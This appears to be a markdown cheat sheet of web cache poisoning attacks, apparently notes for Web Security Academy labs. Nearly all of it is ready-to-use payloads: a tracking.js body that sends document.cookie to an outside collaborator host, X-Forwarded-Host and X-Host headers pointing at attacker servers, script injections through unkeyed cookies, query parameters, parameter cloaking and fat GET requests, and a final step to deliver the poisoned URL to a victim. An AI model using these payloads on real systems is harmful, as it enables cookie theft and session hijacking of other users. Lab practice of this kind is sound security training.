# Web Cache Poisoning

`Always add cache busters to test: /?abc=123`

## If X-Forwarded-Host and X-Cache works:
```
  go to the **exploit server** ->

  in "file": /recources/js/tracking.js
  in "body": document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />')
```
![dsx](https://github.com/user-attachments/assets/e3d70422-eda9-40e9-86e4-eee50eb135e3)

## Web cache poisoning with an unkeyed header:
``
  X-Forwarded-Host: kek.com"></script><script>alert(document.cookie)</script>//
``
## Web cache poisoning with an unkeyed cookie:
``
  Cookie: session=x; fehost=prod-cache-01"}</script><script>alert(1)</script>//
  or
  fehost=someString"-alert(1)-"someString
``
## Web cache poisoning with multiple headers:

    On exploit-server change the file name to match the path used by the vulnerable response: /resources/js/tracking.js. 
    In body write alert(document.cookie) script.

``
  GET /resources/js/tracking.js HTTP/1.1
  Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
  X-Forwarded-Host: exploit-server.web-security-academy.net/
  X-Forwarded-Scheme: http
``
## Targeted web cache poisoning using an unknown header

    HTML is allowed in comment section. Steal user-agent of victim with <img src="http://collaborator.com"> payload.
    or use /resources/js/tracking.js and alert(document.cookie), if u dont have collaborator.
``
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
``
## Web cache poisoning via an unkeyed query string
``
/?search=evil'/><script>alert(1)</script>
Origin:x
``
## Web cache poisoning via an unkeyed query parameter
``
GET /?utm_content=123'/><script>alert(1)</script>
``
## Parameter cloaking
``
/js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
``
## Web cache poisoning via a fat GET request
``
GET /js/geolocate.js?callback=setCountryCookie
Body:
callback=alert(1)
``
## URL normalization
``
/random"><script>alert(1)</script> 
``
or

``
GET /random</p><script>alert(1)</script><p>foo
``

Cache this path and then deliver URL to the victim
